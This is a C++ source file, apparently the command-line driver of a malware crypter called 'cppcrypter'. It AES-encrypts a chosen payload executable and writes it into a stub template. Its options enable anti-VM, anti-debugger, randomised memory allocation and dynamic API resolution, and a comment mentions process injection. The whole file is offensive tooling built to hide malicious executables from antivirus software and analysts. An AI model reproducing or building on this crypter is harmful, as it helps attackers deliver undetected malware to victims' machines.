#include <iostream>
#include <cstring>
#include <string>
#include <vector>
#include <openssl/aes.h>
#include <openssl/rand.h>
#include <fstream>
#include "utils.h"
#include <iomanip>
#include <filesystem>
#include "flags.h"

using namespace std;
namespace fs = std::filesystem;

bool flags[FLAG_COUNT] = {false};

void displayHelp(){
    cout << "\n\033[33mUsage: ./main.exe [options]\nOptions:\n";
    cout << "\t-h, --help                 show all options\n";
    cout << "\t-p                         display paths found for payload, stub output directory, and stub template. cannot be used with other arguments\n";
    cout << "\t-c, --compile              compile stub immediately after writing. makefile must be configured properly\n";
    cout << "\t--payload <C:\\\\path>       specify payload\n";
    cout << "\t--stub <C:\\\\path>          specify stub template\n";
    cout << "\t--rand                     enable random memory allocations\n";
    cout << "\t--vm                       enable anti-VM mode\n";
    cout << "\t--db                       enable anti-debugger mode\n";
    cout << "\t--dyn                      enable dynamic API call resolution\n";
    cout << "\tFlags cannot be combined\033[0m\n";
}


void parseArgs(int argc, char* argv[], string *path_to_payload, string *path_to_output_dir, string *path_to_stub_template){
    string tmp = *path_to_payload;

    for(int i = 1; i < argc; i++){
        if(strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0){
            flags[HELP] = true;
            return;

        } else if(strcmp(argv[i], "-p") == 0){
            flags[PATH] = true;
            return;

        } else if(strcmp(argv[i], "--payload") == 0){
            if(i + 1 >= argc){
                cerr << "\033[31mNo path to payload specified\n\tUsage: ./main --payload \"C:\\\\path\\\\to\\\\payload\"\033[0m\n";
                displayHelp();
                exit(1);
            }
            if(!filesystem::exists(argv[i+1])){
                cerr << "\033[31mInvalid payload path: " << argv[i+1] << "\033[0m\n";
                displayHelp();
                exit(1);
            } else if (!filesystem::is_regular_file(argv[i+1])){
                cerr << "\033[31mInvalid payload path: " << argv[i+1] << "\033[0m\n";
                displayHelp();
                exit(1);
            } else {
                flags[PAYLOAD] = true;
                *path_to_payload = argv[i+1];
                continue;
            }
        } else if(strcmp(argv[i], "--stub") == 0){
            if(i + 1 >= argc){
                cerr << "\033[31mNo path to stub template specified\n\tUsage: ./main --stub \"C:\\\\path\\\\to\\\\stub\\\\template\"\033[0m\n";
                displayHelp();
                exit(1);
            }
            if(!filesystem::exists(argv[i+1])){
                cerr << "\033[31mInvalid stub template path: " << argv[i+1] << "\033[0m\n";
                displayHelp();
                exit(1);
            } else if (!filesystem::is_regular_file(argv[i+1])){
                cerr << "\033[31mInvalid stub template path: " << argv[i+1] << "\033[0m\n";
                displayHelp();
                exit(1);
            } else {
                flags[STUB] = true;
                *path_to_stub_template = argv[i+1];
                continue;
            }
        } else if (strcmp(argv[i], "--rand") == 0){
            flags[RAND] = true;
            continue;

        } else if(strcmp(argv[i], "--vm") == 0){
            flags[VM] = true;
            continue;

        } else if(strcmp(argv[i], "--db") == 0){
            flags[DB] = true;
            continue;

        } else if(strcmp(argv[i], "--dyn") == 0){
            flags[DYN] = true;
            continue;

        } else if(strcmp(argv[i], "-c") == 0 || strcmp(argv[i], "--compile") == 0){
            flags[COMPILE] = true;
            continue;
        } else {
            //cout << "\t\033[32mBuilding default stub...\033[0m\n";
        }
    }

    if (tmp == *path_to_payload) {
        cout << "\033[33mNo payload specified, searching /bin...\033[0m\n";
        if (fs::exists("./bin") && fs::is_directory("./bin")) {
            for (const auto& entry : fs::directory_iterator("./bin")) {
                if (fs::is_regular_file(entry) && ((entry.status().permissions() & fs::perms::owner_exec) != fs::perms::none ||
                                                   (entry.status().permissions() & fs::perms::group_exec) != fs::perms::none ||
                                                   (entry.status().permissions() & fs::perms::others_exec) != fs::perms::none)) {
                    *path_to_payload = entry.path().string();
                    cout << "\t\033[33mFound " << *path_to_payload << "\033[0m\n";
                    return;
                }
            }
            cerr << "\033[31mNo executable found in /bin. Move payload to /bin or specify full path to payload with --payload\033[0m\n";
            exit(1);
        } else {
            cerr << "\033[31m/bin directory does not exist\033[0m\n";
            exit(1);
        }
    }
}
void displayOptions(string *path_to_payload, string *path_to_output_dir, string *path_to_stub_template){
    if(flags[HELP]==true){
        displayHelp();
        exit(0);
    }
    if(flags[PATH]==true){
        cout << "\033[33mPaths:\n\tPath to payload: " << *path_to_payload << "\n\tPath to output directory: " << *path_to_output_dir << "\n\tPath to stub template: " << *path_to_stub_template << "\033[0m\n";
        exit(0);
    }
    if(flags[COMPILE]==true){
        cout << "\n\033[33mCompilation enabled\n\033[0m\n";
    }
    if(flags[PAYLOAD]==true){
        cout << "\n\033[33mPayload set to: " << *path_to_payload << "\033[0m\n";
    }
    if(flags[STUB]==true){
        cout << "\n\033[33mStub template set to: " << *path_to_stub_template << "\033[0m\n";
    }
    if(flags[RAND]==true){
        cout << "\n\033[33mStub randomization mode enabled\033[0m\n";
    }
    if(flags[VM]==true){
        cout << "\n\033[33mAnti-VM mode enabled\033[0m\n";
    }
    if(flags[DB]==true){
        cout << "\n\033[33mAnti-Debugger mode enabled\033[0m\n";
    }
    if(flags[DYN]==true){
        cout << "\n\033[33mDynamic API call resolution enabled\033[0m\n";
    }    
}

int main(int argc, char * argv[]){

    fs::path executable_path = fs::absolute(argv[0]);
    fs::path base_path = executable_path.parent_path().parent_path()/"cppcrypter";  // Assuming the executable is two levels deep from the base path

    // change to bin.exe when procinj is removed
    // Path to payload is initially just the directory where they should be placed
    // If no payload is specified in the args, it will be set to the default
    string path_to_payload = (base_path / "bin").string();
    string path_to_output_dir = (base_path / "stub").string() + "\\";
    string path_to_stub_template = (base_path / "resource\\stub.cpp").string();

    // Make sure the defaults exist before parsing arguments
    if(!filesystem::exists(path_to_payload)){
        cerr << "\033[31m/bin directory not found\033[0m\n";
        exit(1);
    }
    if(!filesystem::exists(path_to_output_dir)){
        cerr << "\033[31moutput directory not found\033[0m\n";
        exit(1);
    }
    if(!filesystem::exists(path_to_stub_template)){
        cout << "\033[31mstub template not found\033[0m\n";
        exit(1);
    }
    parseArgs(argc, argv, &path_to_payload, &path_to_output_dir, &path_to_stub_template);
    displayOptions(&path_to_payload, &path_to_output_dir, &path_to_stub_template);



    // reading bytes of payload
    vector<unsigned char> buf = readBinary(path_to_payload);
    if(buf.empty()){
        cerr << "\033[32mcould not read binary\033[0m\n";
        exit(1);
    }

    // key and IV gen
    auto [key, iv] = generateKeyAndIV(AES_BLOCK_SIZE, AES_BLOCK_SIZE);
    vector<unsigned char> payloadBytes = encrypt(buf, key, iv);
    writeStub(flags, path_to_stub_template, path_to_output_dir, payloadBytes, key, iv);

    return 0;
}
